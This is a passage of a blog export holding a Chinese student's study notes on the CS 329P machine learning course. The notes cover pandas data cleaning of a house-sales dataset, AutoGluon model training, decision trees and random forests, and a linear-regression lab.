--upgrade</span><br></pre></td></tr></table></figure>\n<p>ps：之前我用py脚本写，然后在zsh上运行这个：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> dataclasses <span class=\"keyword\">import</span> dataclass</span><br><span class=\"line\"><span class=\"keyword\">import</span> pandas <span class=\"keyword\">as</span> pd</span><br><span class=\"line\"><span class=\"keyword\">import</span> numpy <span class=\"keyword\">as</span> np</span><br><span class=\"line\"><span class=\"keyword\">import</span> scipy</span><br><span class=\"line\"><span class=\"keyword\">import</span> matplotlib.pyplot <span class=\"keyword\">as</span> plt</span><br><span class=\"line\"><span class=\"keyword\">import</span> seaborn <span class=\"keyword\">as</span> sns</span><br><span class=\"line\"><span class=\"keyword\">from</span> IPython <span class=\"keyword\">import</span> display</span><br><span class=\"line\"><span class=\"keyword\">import</span> pyarrow</span><br><span class=\"line\">matplotlib_inline.set_matplotlib_formats(<span class=\"string\">&#x27;svg&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#data = pd.read_feather(&#x27;house_sales.ftr&#x27;)</span></span><br><span class=\"line\"><span class=\"comment\">#ab = (data[])</span></span><br><span class=\"line\">data = pd.read_feather(<span class=\"string\">&#x27;house_sales.ftr&#x27;</span>)</span><br><span class=\"line\">data.shape</span><br><span class=\"line\">data.head()</span><br></pre></td></tr></table></figure>\n<p>结果是终端没有任何回显，如果是在vscode的终端中运行会报错</p>\n<p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-09-29%20%E4%B8%8A%E5%8D%8810.52.41.png\" alt=\"截屏2022-09-29 上午10.52.41\"></p>\n<p>听说是pyarrow包有问题，但是我浅显地搜了一下并没有很好的解决办法。</p>\n<p>此路不通，但可以换一条。</p>\n<p>直接在终端用IPython的话是可以的，但是相对来说比较麻烦，需要一条一条命令输。不知道有没有其他好方法（为什么外国人这么喜欢用ipython，之前pwn college的那个tutor也是用ipython）。</p>\n<p>注意就是，assignment给的是ftr文件，我大概搜了一下也是一种文件储存的压缩形式，但是需要用<code>pandas</code> 的 <code>read_feather</code>来读取。</p>\n<p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-09-29%20%E4%B8%8A%E5%8D%8810.55.34.png\" alt=\"截屏2022-09-29 上午10.55.34\"></p>\n<p>于是显示效果就是这样，和视频里没有太大的区别。</p>\n<figure class=\"highlight zsh\"><table><tr><td class=\"code\"><pre><span class=\"line\">In [12]: data = pd.read_feather(<span class=\"string\">&#x27;house_sales.ftr&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">In [13]: data.shape</span><br><span class=\"line\">Out[13]: (164944, 1789)</span><br><span class=\"line\"></span><br><span class=\"line\">In [14]: data.head()</span><br><span class=\"line\">Out[14]: </span><br><span class=\"line\">           Id                    Address   Sold Price  ... Tax Legal Tract Number Building Name    Zip</span><br><span class=\"line\">0  2080183300            11205 Monterey,   <span class=\"variable\">$2</span>,000,000  ...                   None          None  95046</span><br><span class=\"line\">1    20926300            5281 Castle Rd,   <span class=\"variable\">$2</span>,100,000  ...                   None          None  91011</span><br><span class=\"line\">2    19595300           3581 Butcher Dr,   <span class=\"variable\">$1</span>,125,000  ...                   None          None  95051</span><br><span class=\"line\">3   300472200      2021 N Milpitas Blvd,  <span class=\"variable\">$36</span>,250,000  ...                   None          None  95035</span><br><span class=\"line\">4  2074492000  LOT 4 Tool Box Spring Rd,     <span class=\"variable\">$140</span>,000  ...                   None          None  92561</span><br><span class=\"line\"></span><br><span class=\"line\">[5 rows x 1789 columns]</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>到这里为止还都是些猴子都能理解的简单操作。</p>\n<p>稍微看一下<code>pandas</code>的官方文档。<a href=\"https://pandas.pydata.org/docs/user_guide/index.html#user-guide\">https://pandas.pydata.org/docs/user_guide/index.html#user-guide</a></p>\n<p>大致是一个很好用的数据处理分析软件，只要有数据基本什么分析都能完成。</p>\n<p>比如说我们刚刚用到的shape方法。</p>\n<p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-09-29%20%E4%B8%8A%E5%8D%8811.02.06.png\" alt=\"截屏2022-09-29 上午11.02.06\"></p>\n<p>就是返回一个<code>tuple</code>（元组，可以理解为一个表）的列和行数。</p>\n<p><code>head()</code>方法就是现实n行的数据（n默认为5）。</p>\n<p>挺有意思的，可以看到我们显示的行和视频不太一样，中间有很多项被省略了，我发现这个和终端窗口大小有关，窗口越宽显示的东西越多。那有没有什么办法能让它全部显示呢。</p>\n<p><a href=\"https://blog.csdn.net/weekdawn/article/details/81389865这篇文章有解释。\">https://blog.csdn.net/weekdawn/article/details/81389865这篇文章有解释。</a></p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">In [37]: data.dtypes</span><br><span class=\"line\">Out[37]: </span><br><span class=\"line\">Id                        object</span><br><span class=\"line\">Address                   object</span><br><span class=\"line\">Sold Price                object</span><br><span class=\"line\">Sold On                   object</span><br><span class=\"line\">Summary                   object</span><br><span class=\"line\">                           ...  </span><br><span class=\"line\">Tax Legal Lot Number      object</span><br><span class=\"line\">Tax Legal Block Number    object</span><br><span class=\"line\">Tax Legal Tract Number    object</span><br><span class=\"line\">Building Name             object</span><br><span class=\"line\">Zip                       object</span><br><span class=\"line\">Length: 1789, dtype: object</span><br></pre></td></tr></table></figure>\n<p>可以看到这个数据集非常牛逼，所有项的类型都是<code>object</code>。</p>\n<h3><span id=\"3作业\">3:作业</span></h3><p>大致看了一下，作业给出的数据集内容和课程里的内容差别还是有的，其中给出的任务也不太一样。</p>\n<p>作业的任务大致是</p>\n<ol>\n<li>用更多的数据进行模型训练</li>\n<li>数据类型转换</li>\n<li>数据清理</li>\n<li>找往年的数据进行训练。</li>\n</ol>\n<p>作业的说明给出了大致的（以上几点）的代码，但是所有的清理包括训练仅有<code>“Sold Price”</code>一项，而作业要求我们使用更多的项来训练。</p>\n<p>但是在拓展之前，先研究一下怎么实现。</p>\n<h4><span id=\"数据清理\">数据清理</span></h4><p>首先依然是导入包，读取数据集。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> pandas <span class=\"keyword\">as</span> pd</span><br><span class=\"line\"><span class=\"keyword\">import</span> numpy <span class=\"keyword\">as</span> np</span><br><span class=\"line\"><span class=\"keyword\">import</span> scipy</span><br><span class=\"line\">data = pd.read_feather(<span class=\"string\">&#x27;house_sales.ftr&#x27;</span>)</span><br><span class=\"line\">df = data[[<span class=\"string\">&#x27;Sold Price&#x27;</span>, <span class=\"string\">&#x27;Sold On&#x27;</span>, <span class=\"string\">&#x27;Type&#x27;</span>, <span class=\"string\">&#x27;Year built&#x27;</span>, <span class=\"string\">&#x27;Bedrooms&#x27;</span>, <span class=\"string\">&#x27;Bathrooms&#x27;</span>]].copy()</span><br></pre></td></tr></table></figure>\n<p>先不管作业的要求，取这些数据出来用作模型训练。</p>\n<p>然后是简单的数据处理</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">c = <span class=\"string\">&#x27;Sold Price&#x27;</span></span><br><span class=\"line\"><span class=\"keyword\">if</span> c <span class=\"keyword\">in</span> df.select_dtypes(<span class=\"string\">&#x27;object&#x27;</span>).columns:</span><br><span class=\"line\">    df.loc[:,c] = np.log10(</span><br><span class=\"line\">            pd.to_numeric(df[c].replace(<span class=\"string\">r&#x27;[$,-]&#x27;</span>, <span class=\"string\">&#x27;&#x27;</span>, regex=<span class=\"literal\">True</span>)) + <span class=\"number\">1</span>)</span><br><span class=\"line\">df = df[(df[<span class=\"string\">&#x27;Sold Price&#x27;</span>] &gt;= <span class=\"number\">4</span> ) &amp; (df[<span class=\"string\">&#x27;Sold Price&#x27;</span>] &lt;= <span class=\"number\">8</span> )]</span><br></pre></td></tr></table></figure>\n<p>因为不太熟悉pands，所以一些方法的使用得一点一点查。</p>\n<p>首先是<code>df.select_dtypes</code></p>\n<p>返回参数指定类型的列表。</p>\n<p>例如这里返回数据集中所有<code>object</code>类型的数据。</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">In [10]: df.select_dtypes(<span class=\"string\">&#x27;object&#x27;</span>)</span><br><span class=\"line\">Out[10]: </span><br><span class=\"line\">                Type Year built Bedrooms Bathrooms</span><br><span class=\"line\">0       SingleFamily    No Data        2       2.0</span><br><span class=\"line\">1       SingleFamily       1951        3       3.0</span><br><span class=\"line\">2       SingleFamily       1954        3       2.0</span><br><span class=\"line\">3          Apartment       1989        0       0.0</span><br><span class=\"line\">4         VacantLand    No Data     None      None</span><br><span class=\"line\">...              ...        ...      ...       ...</span><br><span class=\"line\">164939         Condo       1991        2       2.0</span><br><span class=\"line\">164940         Condo       2009        3       3.0</span><br><span class=\"line\">164941         Condo       2019        2      None</span><br><span class=\"line\">164942  SingleFamily       1973        4       3.0</span><br><span class=\"line\">164943  SingleFamily       1949        4       2.0</span><br><span class=\"line\"></span><br><span class=\"line\">[160839 rows x 4 columns]</span><br></pre></td></tr></table></figure>\n<p>所以这里<code>if c in df.select_dtypes(&#39;object&#39;).columns:</code>指每个object类型列中的‘Sold Price’元素。</p>\n<p><code>df.loc</code></p>\n<p>返回由label标的行列数据。</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">In [13]: df.loc[1]</span><br><span class=\"line\">Out[13]: </span><br><span class=\"line\">Sold Price                6.32222</span><br><span class=\"line\">Sold On       2021-02-25 00:00:00</span><br><span class=\"line\">Type                 SingleFamily</span><br><span class=\"line\">Year built                   1951</span><br><span class=\"line\">Bedrooms                        3</span><br><span class=\"line\">Bathrooms                     3.0</span><br><span class=\"line\">Name: 1, dtype: object</span><br><span class=\"line\"></span><br><span class=\"line\">In [14]: df.loc[2]</span><br><span class=\"line\">Out[14]: </span><br><span class=\"line\">Sold Price               6.051153</span><br><span class=\"line\">Sold On       2019-11-06 00:00:00</span><br><span class=\"line\">Type                 SingleFamily</span><br><span class=\"line\">Year built                   1954</span><br><span class=\"line\">Bedrooms                        3</span><br><span class=\"line\">Bathrooms                     2.0</span><br><span class=\"line\">Name: 2, dtype: object</span><br></pre></td></tr></table></figure>\n<p> <code>df.loc[:,c]</code>表示取出列表中所有行列项中含c的部分。即打印所有<code>&#39;Sold Price&#39;</code></p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">In [12]: df.loc[:,c]</span><br><span class=\"line\">Out[12]: </span><br><span class=\"line\">0         6.301030</span><br><span class=\"line\">1         6.322220</span><br><span class=\"line\">2         6.051153</span><br><span class=\"line\">3         7.559308</span><br><span class=\"line\">4         5.146131</span><br><span class=\"line\">            ...   </span><br><span class=\"line\">164939    5.750915</span><br><span class=\"line\">164940    6.423246</span><br><span class=\"line\">164941    6.132580</span><br><span class=\"line\">164942    6.146128</span><br><span class=\"line\">164943    5.352184</span><br><span class=\"line\">Name: Sold Price, Length: 160839, dtype: float64</span><br></pre></td></tr></table></figure>\n<p>np.log10</p>\n<p>这里又是包<code>numpy</code>的方法了。官方文档：<a href=\"https://numpy.org/doc/stable/reference/generated/numpy.log10.html\">https://numpy.org/doc/stable/reference/generated/numpy.log10.html</a></p>\n<p>比较简单易懂，返回log10。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">np.log10(pd.to_numeric(df[c].replace(<span class=\"string\">r&#x27;[$,-]&#x27;</span>, <span class=\"string\">&#x27;&#x27;</span>, regex=<span class=\"literal\">True</span>)) + <span class=\"number\">1</span>)</span><br></pre></td></tr></table></figure>\n<p><code>pd.to_numeric</code></p>\n<p>转换为数字类型。根据提供的数据转换为float64或int64。</p>\n<p>转换的数据<code>df[c].replace(r&#39;[$,-]&#39;, &#39;&#39;, regex=True)</code></p>\n<p>前一项为要替换的值，后一项为替换后的值，这里就是把所有空项或者带¥符号带项删去。</p>\n<p>然后留下<code>log10(SoldPrice)</code>在四到八之间的值，其他被视为噪音。</p>\n<p>接着</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">test_start, test_end = pd.Timestamp(<span class=\"number\">2021</span>, <span class=\"number\">2</span>, <span class=\"number\">15</span>), pd.Timestamp(<span class=\"number\">2021</span>, <span class=\"number\">3</span>, <span class=\"number\">1</span>)</span><br><span class=\"line\">train_start = pd.Timestamp(<span class=\"number\">2021</span>, <span class=\"number\">1</span>, <span class=\"number\">1</span>)</span><br><span class=\"line\">df[<span class=\"string\">&#x27;Sold On&#x27;</span>] = pd.to_datetime(df[<span class=\"string\">&#x27;Sold On&#x27;</span>], errors=<span class=\"string\">&#x27;coerce&#x27;</span>)</span><br><span class=\"line\">train = df[(df[<span class=\"string\">&#x27;Sold On&#x27;</span>] &gt;= train_start) &amp; (df[<span class=\"string\">&#x27;Sold On&#x27;</span>] &lt; test_start)]</span><br><span class=\"line\">test = df[(df[<span class=\"string\">&#x27;Sold On&#x27;</span>] &gt;= test_start) &amp; (df[<span class=\"string\">&#x27;Sold On&#x27;</span>] &lt; test_end)]</span><br><span class=\"line\">train.shape, test.shape</span><br></pre></td></tr></table></figure>\n<p>设置时间戳，因为训练需要预测不同时间点的数据，</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">rmsle</span>(<span class=\"params\">y_hat, y</span>):</span></span><br><span class=\"line\">    <span class=\"comment\"># we already used log prices before, so we only need to compute RMSE</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"built_in\">sum</span>((y_hat - y)**<span class=\"number\">2</span> / <span class=\"built_in\">len</span>(y))**<span class=\"number\">0.5</span></span><br></pre></td></tr></table></figure>\n<p>没看懂，课程里讲了吗（俺只看到了3.2的三分之一），什么算均方误差？</p>\n<p>然后进行训练。</p>\n<h4><span id=\"训练\">训练</span></h4><p>首先引入<code>from autogluon.tabular import TabularPredictor</code>这个包，用来探测什么模型最适合我们的数据。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">label = <span class=\"string\">&#x27;Sold Price&#x27;</span>    </span><br><span class=\"line\">predictor = TabularPredictor(label=label).fit(train)</span><br></pre></td></tr></table></figure>\n<p>没有什么不好理解的地方吧。</p>\n<p>这里测试了很多模型，其中这个模型告诉我<code>Best model: &quot;WeightedEnsemble_L2&quot;</code>。</p>\n<p>ps：这个<code>root_mean_squared_error</code>不是在报错，是一个数学指标，中文是均方根误差（吃了没文化的亏</p>\n<p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-09-30%20%E4%B8%8B%E5%8D%889.41.05.png\" alt=\"截屏2022-09-30 下午9.41.05\"></p>\n<p>稍微研究一下这个<code>AutoGluon</code></p>\n<p>官方文档：<a href=\"https://auto.gluon.ai/stable/index.html\">https://auto.gluon.ai/stable/index.html</a></p>\n<p>话说好神奇，我应该是从没有安装过这个包，但是导入的时候也没有报错就运行了。</p>\n<p>官方文档没啥好看的，商业宣传用语，来看看log。</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">No path specified. Models will be saved <span class=\"keyword\">in</span>: <span class=\"string\">&quot;AutogluonModels/ag-20220930_122428/&quot;</span></span><br><span class=\"line\">Beginning AutoGluon training ...</span><br><span class=\"line\">AutoGluon will save models to <span class=\"string\">&quot;AutogluonModels/ag-20220930_122428/&quot;</span></span><br><span class=\"line\">AutoGluon Version:  0.5.2</span><br><span class=\"line\">Python Version:     3.9.10</span><br><span class=\"line\">Operating System:   Darwin</span><br><span class=\"line\">Train Data Rows:    24872</span><br><span class=\"line\">Train Data Columns: 5</span><br><span class=\"line\">Label Column: Sold Price</span><br><span class=\"line\">Preprocessing data ...</span><br><span class=\"line\">AutoGluon infers your prediction problem is: <span class=\"string\">&#x27;regression&#x27;</span> (because dtype of label-column == <span class=\"built_in\">float</span> and many unique label-values observed).</span><br></pre></td></tr></table></figure>\n<p>因为我的数据都是整数或者浮点，它就自动识别我需要的预测类型为回归。</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">Label info (max, min, mean, stddev): (7.546542675816042, 4.000043427276863, 5.75084, 0.39719)</span><br><span class=\"line\">If <span class=\"string\">&#x27;regression&#x27;</span> is not the correct problem_type, please manually specify the problem_type parameter during predictor init (You may specify problem_type as one of: [<span class=\"string\">&#x27;binary&#x27;</span>, <span class=\"string\">&#x27;multiclass&#x27;</span>, <span class=\"string\">&#x27;regression&#x27;</span>])</span><br></pre></td></tr></table></figure>\n<p>然后打印了一些值。</p>\n<p>并且可以手动修改预测类型。</p>\n<p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-09-30%20%E4%B8%8B%E5%8D%889.58.41.png\" alt=\"截屏2022-09-30 下午9.58.41\"></p>\n<p>到这里应该是进行自动的特征工程。</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">AutoGluon will gauge predictive performance using evaluation metric: <span class=\"string\">&#x27;root_mean_squared_error&#x27;</span></span><br></pre></td></tr></table></figure>\n<p>用均分根误差来预测。</p>\n<p>然后是一些模型的适配。</p>\n<p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-09-30%20%E4%B8%8B%E5%8D%8810.00.44.png\" alt=\"截屏2022-09-30 下午10.00.44\"></p>\n<p>pps：均方根误差是高数还是概率论的内容。。。</p>\n<p>所以它的值是越小越好。（确实那个“最适合”的模型的rmse也是最小的）</p>\n<p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-09-30%20%E4%B8%8B%E5%8D%8810.03.25.png\" alt=\"截屏2022-09-30 下午10.03.25\"></p>\n<p>其中还会有一些报错，大概还是因为依赖。懒得装了，等什么时候用上再说。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">predictor.leaderboard(test, silent=<span class=\"literal\">True</span>)</span><br></pre></td></tr></table></figure>\n<p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-09-30%20%E4%B8%8B%E5%8D%8810.06.14.png\" alt=\"截屏2022-09-30 下午10.06.14\"></p>\n<p>这一条使数据在每个模型中训练一遍。</p>\n<p>预测。</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">In [20]: preds = predictor.predict(test.drop(columns=[label]))</span><br><span class=\"line\">    ...: rmsle(preds, <span class=\"built_in\">test</span>[label])</span><br><span class=\"line\">Out[20]: 0.2798629260751236</span><br></pre></td></tr></table></figure>\n<p>no my solution，thanks.</p>\n<h3><span id=\"4-胡言乱语2\">4： 胡言乱语2</span></h3><p>这一个part主要是介绍了数据处理的流程以及大致的思路，代码量其实不大，也比较简单，熟悉一下pandas就好了。下一个part就涉及到具体的模型了，我浅看了一眼，全是数学，我一个生怕概率论挂科担心了半个寒假的平平无奇的数学废物真的有点害怕。</p>\n","categories":["ML"],"tags":["CS329P"]},{"title":"CS 329P note2","url":"/2022/09/30/ml_CS%20329P%20%7C%20note%202/","content":"<link rel=\"stylesheet\" class=\"aplayer-secondary-style-marker\" href=\"/assets/css/APlayer.min.css\"><script src=\"/assets/js/APlayer.min.js\" class=\"aplayer-secondary-script-marker\"></script><script class=\"meting-secondary-script-marker\" src=\"/assets/js/Meting.min.js\"></script><p>​    \n    <div id=\"aplayer-iDYzpLWM\" class=\"aplayer aplayer-tag-marker meting-tag-marker\" data-id=\"7342554262\" data-server=\"netease\" data-type=\"playlist\" data-mode=\"circulation\" data-autoplay=\"false\" data-mutex=\"true\" data-listmaxheight=\"340px\" data-preload=\"auto\" data-theme=\"#555\"></div>     </p>\n<h2><span id=\"0-胡言乱语1\">0: 胡言乱语1</span></h2><p>note2，进入模型的学习部分，这一部分似乎并没有涉及太多的代码知识，主要是讲解数学原理。</p>\n<p>众所周知md也不好打公式，这一篇水水就过去了。</p>\n<h2><span id=\"2-复习\">2: 复习</span></h2><h3><span id=\"ml算法概述\">ml算法概述</span></h3><p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/img2.svg\" alt=\"img2\"></p>\n<h3><span id=\"最简单的决策树\">最简单的决策树</span></h3><h4><span id=\"概述\">概述</span></h4><p>类似if else的逻辑，将大的数据不断分类，直到达到最小单位（？</p>\n<p>图中演示了两种决策树，左边是用于数据的分类，右边用于数据的回归，但是本质上两者都是一样的。</p>\n<p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-10-01%20%E4%B8%8A%E5%8D%8811.08.32.png\" alt=\"截屏2022-10-01 上午11.08.32\"></p>\n<h4><span id=\"建立决策树\">建立决策树</span></h4><ol>\n<li>从根节点开始</li>\n<li>对于每个父节点，选择一个特征来划分数据。</li>\n</ol>\n<h4><span id=\"决策树的局限性\">决策树的局限性</span></h4><ol>\n<li>过于复杂的决策树会过拟合数据</li>\n<li>决策树对于数据的敏感程度较高</li>\n<li>难以进行并行运算</li>\n</ol>\n<p>ps：过拟合：</p>\n<p>大概指的是衡量模型好坏的两个指标分别是泛化和训练误差。</p>\n<p>训练误差指模型对于喂给的数据集的拟合结果的误差，泛化误差指模型对未知数据集的拟合结果的误差，</p>\n<p>而衡量泛化的直观表现就是模型是否欠拟合或过拟合。</p>\n<p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/v2-0ecc4dee7383ccf1995de08cdddc84d9_720w.jpg\" alt=\"img\"></p>\n<p>欠拟合指模型对于训练数据的拟合能力不够，而过拟合指模型过于复杂时，便有些僵硬地只善于反馈训练的数据集，而不会举一反三拟合未知的数据，导致泛化误差变大，也侧面证实了前文中“过于复杂的决策树模型容易导致过拟合。”</p>\n<h4><span id=\"随机森林决策树-pro-max\">随机森林（决策树 pro max）</span></h4><p>简单来说就是训练多颗决策树，组成森林，并且每个树的训练过程都是独立并行的。</p>\n<p>为了提升决策树稳定性，最终训练结果可能是整个随机森林的均值。</p>\n<h5><span id=\"随机性\">随机性</span></h5><p>随机森林的“随机性”来源于两点</p>\n<ol>\n<li>样本bagging</li>\n<li>对数据集特征进行采样，挑选出子集用来训练。</li>\n</ol>\n<p>bagging值对于一个大的数据集，随机地采样生成新的数据集后用来训练，每一棵树的数据集都是随机生成的新数据集。（比如大的数据集<code>[1,2,3,4,5,6,7]</code>进行随机采样生成随机数据集1<code>[1,1,1,2,3,5,2]</code>，然后用这个生成的数据集喂模型。</p>\n<h5><span id=\"gradient-boosting\">Gradient Boosting</span></h5><p>提升决策树模型的方法之一。</p>\n<p>梯度boosting（不好翻译，可能直译就是梯度提升）</p>\n<p>用当前训练的n颗树预测n+1颗树的值，并用真实的n+1颗树的值减去前面的预测值得到残差，并在残差上做当前树的训练。</p>\n<p>这一块的梯度部分没搞懂。</p>\n<p>有点看烦了，去看一点内核题，顺便复习一下dsp，搞完了再来看。</p>\n","categories":["ML"],"tags":["CS329P"]},{"title":"CS 329P note3","url":"/2022/10/13/ml_CS%20329P%20%7C%20note3/","content":"<link rel=\"stylesheet\" class=\"aplayer-secondary-style-marker\" href=\"/assets/css/APlayer.min.css\"><script src=\"/assets/js/APlayer.min.js\" class=\"aplayer-secondary-script-marker\"></script><script class=\"meting-secondary-script-marker\" src=\"/assets/js/Meting.min.js\"></script><p>​    \n    <div id=\"aplayer-jOudfGNH\" class=\"aplayer aplayer-tag-marker meting-tag-marker\" data-id=\"7342554262\" data-server=\"netease\" data-type=\"playlist\" data-mode=\"circulation\" data-autoplay=\"false\" data-mutex=\"true\" data-listmaxheight=\"340px\" data-preload=\"auto\" data-theme=\"#555\"></div>     </p>\n<h2><span id=\"胡言乱语\">胡言乱语</span></h2><p>part3，聚焦于线性模型算法。</p>\n<p>为什么note2和note3隔了这么久，因为看cs 329发现完全看不懂，于是又去从头看了229，把线性模型的part看完之后反过来又去review 329，终于发现能看懂了orz。</p>\n<h2><span id=\"线性模型分类\">线性模型分类</span></h2><ol>\n<li>回归</li>\n<li>分类</li>\n</ol>\n<p>ps：上一个note说到主要利用决策树进行分类。</p>\n<h3><span id=\"线性模型的参数amp方程\">线性模型的参数&amp;方程</span></h3><p>比较重要的方程就是</p>\n<ol>\n<li>预测模型的假设函数</li>\n<li>用于拟合数据的代价函数</li>\n</ol>\n<p>参数则就是假设函数中的参数，而代价函数的作用就是通过不断优化参数来使得梯度下降到达局部收敛，最后记录相关参数的值。</p>\n<h4><span id=\"回归\">回归</span></h4><p>post一些笔记/// </p>\n<p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/IMG_4681.jpg\" alt=\"IMG_4681\"></p>\n<p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/IMG_4682.jpg\" alt=\"IMG_4682\"></p>\n<p>ps：多元线性回归与一元线性回归在模型中其实计算的核心思想都是利用线性的参数矩阵的转置与变量矩阵相乘，变量则可以利用复合函数的思想，将其优化为一元变量，只不多在特征缩放时需要多加注意。</p>\n<h4><span id=\"分类\">分类</span></h4><p>还没看orz。</p>\n<h2><span id=\"练习\">练习</span></h2><p>所有文档的链接来自<a href=\"https://github.com/kaieye/2022-Machine-Learning-Specialization\">https://github.com/kaieye/2022-Machine-Learning-Specialization</a></p>\n<p>这里看的是<code>2022-Machine-Learning-Specialization-main/Supervised Machine Learning Regression and Classification/week1/work</code></p>\n<p>也就是监督学习的week1。</p>\n<h3><span id=\"lab1\">lab1</span></h3><p>？？python入门？</p>\n<h3><span id=\"lab2\">lab2</span></h3><p>打不开？</p>\n<h3><span id=\"lab3\">lab3</span></h3><p>单变量的线性回归模型。</p>\n<p>导入包，还是matplotlib和numpy。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> numpy <span class=\"keyword\">as</span> np</span><br><span class=\"line\"><span class=\"keyword\">import</span> matplotlib.pyplot <span class=\"keyword\">as</span> plt</span><br><span class=\"line\">plt.style.use(<span class=\"string\">&#x27;./deeplearning.mplstyle&#x27;</span>)</span><br></pre></td></tr></table></figure>\n<p>要求对于一个<strong>两个样本</strong>的数据集进行<strong>线性模型的拟合</strong>。</p>\n<p>方式是</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># x_train is the input variable (size in 1000 square feet)</span></span><br><span class=\"line\"><span class=\"comment\"># y_train is the target (price in 1000s of dollars)</span></span><br><span class=\"line\">x_train = np.array([<span class=\"number\">1.0</span>, <span class=\"number\">2.0</span>])</span><br><span class=\"line\">y_train = np.array([<span class=\"number\">300.0</span>, <span class=\"number\">500.0</span>])</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">f&quot;x_train = <span class=\"subst\">&#123;x_train&#125;</span>&quot;</span>)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">f&quot;y_train = <span class=\"subst\">&#123;y_train&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure>\n<p>我们的目的是生成价格关于房子尺寸的图表，于是x轴为面积，y轴为价格，将<strong>数据集的数据作为数组元素输入</strong>到<code>x_train</code>和<code>y_train</code>中去。</p>\n<p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-10-13%20%E4%B8%8B%E5%8D%884.02.35.png\" alt=\"截屏2022-10-13 下午4.02.35\"></p>\n<p>接下来介绍了<strong>获取样本数量</strong>的两种方式，一种是直接用<code>len()</code>函数，另一种是利用<code>numpy</code>的<code>shape</code>方法。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">m1 = <span class=\"built_in\">len</span>(x_train)</span><br><span class=\"line\">m2 = x_train.shape[<span class=\"number\">0</span>]<span class=\"comment\">#shape[0] 返回数组长度</span></span><br><span class=\"line\"><span class=\"built_in\">print</span>(m1)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(m2)</span><br></pre></td></tr></table></figure>\n<p>回显：</p>\n<figure class=\"highlight zsh\"><table><tr><td class=\"code\"><pre><span class=\"line\">rin@Ste1nsG4t3 work % python3 lab3.py</span><br><span class=\"line\">x_train = [1. 2.]</span><br><span class=\"line\">y_train = [300. 500.]</span><br><span class=\"line\">2</span><br><span class=\"line\">2</span><br></pre></td></tr></table></figure>\n<p>将<strong>数组标号</strong>。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">2</span>):</span><br><span class=\"line\">\tx_i = x_train[i]</span><br><span class=\"line\">\ty_i = y_train[i]</span><br><span class=\"line\">\t<span class=\"built_in\">print</span>(<span class=\"string\">f&quot;(x^(<span class=\"subst\">&#123;i&#125;</span>), y^(<span class=\"subst\">&#123;i&#125;</span>)) = (<span class=\"subst\">&#123;x_i&#125;</span>, <span class=\"subst\">&#123;y_i&#125;</span>)&quot;</span>)</span><br></pre></td></tr></table></figure>\n<p>回显：</p>\n<figure class=\"highlight zsh\"><table><tr><td class=\"code\"><pre><span class=\"line\">rin@Ste1nsG4t3 work % python3 lab3.py</span><br><span class=\"line\">x_train = [1. 2.]</span><br><span class=\"line\">y_train = [300. 500.]</span><br><span class=\"line\">(x^(0), y^(0)) = (1.0, 300.0)</span><br><span class=\"line\">(x^(1), y^(1)) = 